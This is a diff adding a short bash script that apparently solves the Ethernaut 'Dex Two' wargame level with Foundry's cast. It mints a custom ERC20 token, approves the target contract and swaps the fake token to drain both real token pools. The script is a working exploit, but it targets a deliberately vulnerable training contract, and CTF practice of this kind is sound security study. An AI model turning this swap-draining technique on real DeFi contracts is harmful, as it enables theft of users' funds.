@@ -1,0 +1,18 @@
+#!/bin/bash
+
+set -e -o pipefail
+
+source key
+
+CON=0x89750DF7392a806E745AeBB821d5d48939b97658
+
+# forge create --private-key $KEY '23.dex_two.sol:TestERC20'
+ERC=0x1c398a8d93089a3415e42f8f5a0081f48b31ab52
+
+cast send --private-key $KEY $ERC 'mint(address,uint)' $CON 1
+cast send --private-key $KEY $ERC 'mint(address,uint)' $ADDR 3
+cast send --private-key $KEY $ERC 'approve(address, uint)' $CON 3
+TOKEN1=$(cast --to-hex $(cast --to-dec $(cast call $CON 'token1()')))
+cast send --gas 1000000 --private-key $KEY $CON 'swap(address, address, uint)' $ERC $TOKEN1 1
+TOKEN2=$(cast --to-hex $(cast --to-dec $(cast call $CON 'token2()')))
+cast send --gas 1000000 --private-key $KEY $CON 'swap(address, address, uint)' $ERC $TOKEN2 2
